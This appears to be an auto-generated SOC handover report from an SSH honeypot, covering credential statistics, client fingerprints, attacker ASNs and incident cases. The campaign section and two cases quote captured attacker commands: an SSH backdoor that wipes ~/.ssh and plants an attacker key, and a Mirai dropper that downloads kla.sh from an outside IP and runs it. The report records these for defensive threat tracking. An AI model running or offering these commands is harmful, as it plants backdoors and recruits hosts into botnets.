# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-14 |
| **Generated At** | 2026-11-14T17:29:42Z |
| **Shift Time** | 17:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **549** |
| Confirmed Threats | **493** |
| False Positives Filtered | **56** (10.2%) |
| Unique Attacker IPs | **306** |
| Countries of Origin | **53** |
| High Severity Cases | **375** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **174** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4994** |
| Unique Credential Pairs | **1441** |
| Unique Usernames | **441** |
| Unique Passwords | **962** |
| Successful Auth Pairs | **4784** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1802 |
| `admin` | 221 |
| `ubuntu` | 136 |
| `user` | 95 |
| `deploy` | 77 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 270 |
| `123` | 139 |
| `1234` | 111 |
| `12345678` | 76 |
| `root` | 74 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 34 |
| `support` | `support` | 28 |
| `root` | `root3245gs5662d34111111111` | 27 |
| `admin` | `BrAhMoS@15` | 26 |
| `admin` | `admin` | 16 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `BrAhMoS@15` | `77.239.124.252` | 2026-11-14T02:56:18 |
| `root` | `P@ssw0rd123!@#` | `10.0.0.73` | 2026-11-14T02:57:42 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-14T02:57:46 |
| `root` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-14T02:57:49 |
| `root` | `Aa520520` | `58.186.20.143` | 2026-11-14T03:02:52 |
| `345gs5662d34` | `345gs5662d34` | `58.186.20.143` | 2026-11-14T03:02:56 |
| `root` | `3245gs5662d34` | `58.186.20.143` | 2026-11-14T03:02:58 |
| `guest` | `webmaster` | `117.2.123.19` | 2026-11-14T03:07:05 |
| `guest` | `webmaster` | `70.167.235.18` | 2026-11-14T03:07:15 |
| `squid` | `squid` | `138.226.239.233` | 2026-11-14T03:12:12 |
| `ubnt` | `ubnt` | `80.94.95.118` | 2026-11-14T03:13:18 |
| `manager` | `friend` | `10.0.0.73` | 2026-11-14T03:13:19 |
| `ubnt` | `ubnt` | `10.0.0.73` | 2026-11-14T03:13:29 |
| `manager` | `friend` | `77.90.185.29` | 2026-11-14T03:14:15 |
| `osmanatmc` | `Acamtanamso1` | `154.14.139.242` | 2026-11-14T03:18:38 |
| `osmanatmc` | `Acamtanamso1` | `66.27.132.114` | 2026-11-14T03:18:48 |
| `root` | `stfu_and_be_quite` | `92.40.57.51` | 2026-11-14T03:21:09 |
| `root` | `stfu_and_be_quite` | `83.233.126.5` | 2026-11-14T03:21:18 |
| `user1` | `1234` | `173.79.110.32` | 2026-11-14T03:21:50 |
| `user1` | `1234` | `122.168.197.245` | 2026-11-14T03:21:59 |
_… 4764 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **549** |
| Sessions with Fingerprint | **30** |
| Unique HASSH Fingerprints | **30** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 182 |
| OpenSSH | 153 |
| libssh | 44 |
| Unknown | 4 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 138 | 130 |
| `2ec37a7cc8da...` | Mirai/variant | 123 | 3 |
| `f555226df196...` | Mirai/variant | 32 | 16 |
| `7d01d047ace6...` | Mirai/variant | 14 | 4 |
| `03a80b21afa8...` | Modern SSH client | 9 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 138 | 130 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 123 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 32 | 16 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 14 | 4 | Mirai/variant |
| `03a80b21afa8...` | libssh | 9 | 5 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 9 | 4 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 8 | 4 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **132** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 19 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `163.7.9.55`, `141.11.0.18`, `43.154.195.142`, `103.214.63.38`, `136.0.246.141`, `50.6.204.157`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **306** |
| Unique ASNs | **138** |
| High-Risk ASNs | **118** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 64 | HIGH |
| `AS4766` | Korea Telecom | 18 | HIGH |
| `AS22773` | Cox Communications Inc. | 12 | HIGH |
| `AS4134` | CHINANET BACKBONE | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS15169` | Google LLC | 6 | HIGH |
| `AS9829` | National Internet Backbone | 6 | HIGH |
| `AS25159` | PJSC MegaFon | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (361)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-00d13fc1e57e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]252` |
| **First Seen** | 2026-11-14 02:56 |
| **Last Seen** | 2026-11-14 02:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 02:56:17` | `cowrie.session.connect` |
| `2026-11-14 02:56:18` | `cowrie.login.success` |
| `2026-11-14 02:56:18` | `cowrie.session.params` |
| `2026-11-14 02:56:18` | `cowrie.log.closed` |
| `2026-11-14 02:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d9d8110287

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-11-14 03:02 |
| **Last Seen** | 2026-11-14 03:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:02:51` | `cowrie.session.connect` |
| `2026-11-14 03:02:51` | `cowrie.client.version` |
| `2026-11-14 03:02:51` | `cowrie.client.kex` |
| `2026-11-14 03:02:52` | `cowrie.login.success` |
| `2026-11-14 03:02:53` | `cowrie.session.params` |
| `2026-11-14 03:02:53` | `cowrie.command.input` |
| `2026-11-14 03:02:53` | `cowrie.command.failed` |
| `2026-11-14 03:02:53` | `cowrie.log.closed` |
| `2026-11-14 03:02:54` | `cowrie.session.params` |
| `2026-11-14 03:02:54` | `cowrie.command.input` |
| `2026-11-14 03:02:55` | `cowrie.session.file_download` |
| `2026-11-14 03:02:55` | `cowrie.log.closed` |
| `2026-11-14 03:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7bd882ebda

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-11-14 03:02 |
| **Last Seen** | 2026-11-14 03:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:02:55` | `cowrie.session.connect` |
| `2026-11-14 03:02:55` | `cowrie.client.version` |
| `2026-11-14 03:02:55` | `cowrie.client.kex` |
| `2026-11-14 03:02:56` | `cowrie.login.success` |
| `2026-11-14 03:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aceab254738

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-11-14 03:07 |
| **Last Seen** | 2026-11-14 03:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:07:02` | `cowrie.session.connect` |
| `2026-11-14 03:07:03` | `cowrie.client.version` |
| `2026-11-14 03:07:03` | `cowrie.client.kex` |
| `2026-11-14 03:07:05` | `cowrie.login.success` |
| `2026-11-14 03:07:06` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8e0c6437d8

| Field | Detail |
|---|---|
| **Source IP** | `70.167.235[.]18` |
| **First Seen** | 2026-11-14 03:07 |
| **Last Seen** | 2026-11-14 03:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:07:12` | `cowrie.session.connect` |
| `2026-11-14 03:07:13` | `cowrie.client.version` |
| `2026-11-14 03:07:13` | `cowrie.client.kex` |
| `2026-11-14 03:07:15` | `cowrie.login.success` |
| `2026-11-14 03:07:15` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.167.235[.]18` to AbuseIPDB if not already reported
- [ ] Block `70.167.235[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cebd2230f56

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-14 03:12 |
| **Last Seen** | 2026-11-14 03:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:12:12` | `cowrie.session.connect` |
| `2026-11-14 03:12:12` | `cowrie.client.version` |
| `2026-11-14 03:12:12` | `cowrie.client.kex` |
| `2026-11-14 03:12:12` | `cowrie.login.success` |
| `2026-11-14 03:12:12` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:12:12` | `cowrie.direct-tcpip.ja4` |
| `2026-11-14 03:12:12` | `cowrie.direct-tcpip.data` |
| `2026-11-14 03:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5bd4ca4640f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-14 03:13 |
| **Last Seen** | 2026-11-14 03:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:13:18` | `cowrie.session.connect` |
| `2026-11-14 03:13:18` | `cowrie.client.version` |
| `2026-11-14 03:13:18` | `cowrie.client.kex` |
| `2026-11-14 03:13:18` | `cowrie.login.success` |
| `2026-11-14 03:13:18` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:13:18` | `cowrie.direct-tcpip.ja4` |
| `2026-11-14 03:13:18` | `cowrie.direct-tcpip.data` |
| `2026-11-14 03:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e798a3f6f156

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-14 03:14 |
| **Last Seen** | 2026-11-14 03:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:14:15` | `cowrie.session.connect` |
| `2026-11-14 03:14:15` | `cowrie.client.version` |
| `2026-11-14 03:14:15` | `cowrie.client.kex` |
| `2026-11-14 03:14:15` | `cowrie.login.success` |
| `2026-11-14 03:14:15` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:14:15` | `cowrie.direct-tcpip.ja4` |
| `2026-11-14 03:14:15` | `cowrie.direct-tcpip.data` |
| `2026-11-14 03:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db56bde759bf

| Field | Detail |
|---|---|
| **Source IP** | `154.14.139[.]242` |
| **First Seen** | 2026-11-14 03:18 |
| **Last Seen** | 2026-11-14 03:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:18:36` | `cowrie.session.connect` |
| `2026-11-14 03:18:37` | `cowrie.client.version` |
| `2026-11-14 03:18:37` | `cowrie.client.kex` |
| `2026-11-14 03:18:38` | `cowrie.login.success` |
| `2026-11-14 03:18:38` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.14.139[.]242` to AbuseIPDB if not already reported
- [ ] Block `154.14.139[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9620ba6ceea6

| Field | Detail |
|---|---|
| **Source IP** | `66.27.132[.]114` |
| **First Seen** | 2026-11-14 03:18 |
| **Last Seen** | 2026-11-14 03:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:18:45` | `cowrie.session.connect` |
| `2026-11-14 03:18:46` | `cowrie.client.version` |
| `2026-11-14 03:18:46` | `cowrie.client.kex` |
| `2026-11-14 03:18:48` | `cowrie.login.success` |
| `2026-11-14 03:18:48` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.27.132[.]114` to AbuseIPDB if not already reported
- [ ] Block `66.27.132[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d9c4b4b2ae2

| Field | Detail |
|---|---|
| **Source IP** | `92.40.57[.]51` |
| **First Seen** | 2026-11-14 03:21 |
| **Last Seen** | 2026-11-14 03:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:21:07` | `cowrie.session.connect` |
| `2026-11-14 03:21:08` | `cowrie.client.version` |
| `2026-11-14 03:21:08` | `cowrie.client.kex` |
| `2026-11-14 03:21:09` | `cowrie.login.success` |
| `2026-11-14 03:21:09` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.40.57[.]51` to AbuseIPDB if not already reported
- [ ] Block `92.40.57[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca54ac88b0a

| Field | Detail |
|---|---|
| **Source IP** | `83.233.126[.]5` |
| **First Seen** | 2026-11-14 03:21 |
| **Last Seen** | 2026-11-14 03:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:21:16` | `cowrie.session.connect` |
| `2026-11-14 03:21:17` | `cowrie.client.version` |
| `2026-11-14 03:21:17` | `cowrie.client.kex` |
| `2026-11-14 03:21:18` | `cowrie.login.success` |
| `2026-11-14 03:21:19` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.126[.]5` to AbuseIPDB if not already reported
- [ ] Block `83.233.126[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbd6221f4c8

| Field | Detail |
|---|---|
| **Source IP** | `173.79.110[.]32` |
| **First Seen** | 2026-11-14 03:21 |
| **Last Seen** | 2026-11-14 03:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:21:48` | `cowrie.session.connect` |
| `2026-11-14 03:21:48` | `cowrie.client.version` |
| `2026-11-14 03:21:48` | `cowrie.client.kex` |
| `2026-11-14 03:21:50` | `cowrie.login.success` |
| `2026-11-14 03:21:50` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.79.110[.]32` to AbuseIPDB if not already reported
- [ ] Block `173.79.110[.]32` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac43bdcdfa44

| Field | Detail |
|---|---|
| **Source IP** | `122.168.197[.]245` |
| **First Seen** | 2026-11-14 03:21 |
| **Last Seen** | 2026-11-14 03:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:21:56` | `cowrie.session.connect` |
| `2026-11-14 03:21:57` | `cowrie.client.version` |
| `2026-11-14 03:21:57` | `cowrie.client.kex` |
| `2026-11-14 03:21:59` | `cowrie.login.success` |
| `2026-11-14 03:22:00` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.197[.]245` to AbuseIPDB if not already reported
- [ ] Block `122.168.197[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ccf87f9077

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-14 03:22 |
| **Last Seen** | 2026-11-14 03:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:22:22` | `cowrie.session.connect` |
| `2026-11-14 03:22:22` | `cowrie.client.version` |
| `2026-11-14 03:22:22` | `cowrie.client.kex` |
| `2026-11-14 03:22:23` | `cowrie.login.success` |
| `2026-11-14 03:22:23` | `cowrie.direct-tcpip.request` |
| `2026-11-14 03:22:23` | `cowrie.direct-tcpip.data` |
| `2026-11-14 03:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e088fd1bf5

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-11-14 03:29 |
| **Last Seen** | 2026-11-14 03:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 03:29:22` | `cowrie.session.connect` |
| `2026-11-14 03:29:22` | `cowrie.client.version` |
| `2026-11-14 03:29:22` | `cowrie.client.kex` |
| `2026-11-14 03:29:23` | `cowrie.login.success` |
| `2026-11-14 03:29:24` | `cowrie.session.params` |
| `2026-11-14 03:29:24` | `cowrie.command.input` |
| `2026-11-14 03:29:24` | `cowrie.command.failed` |
| `2026-11-14 03:29:24` | `cowrie.log.closed` |
| `2026-11-14 03:29:25` | `cowrie.session.params` |
| `2026-11-14 03:29:25` | `cowrie.command.input` |
| `2026-11-14 03:29:25` | `cowrie.session.file_download` |
| `2026-11-14 03:29:25` | `cowrie.log.closed` |
| `2026-11-14 03:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

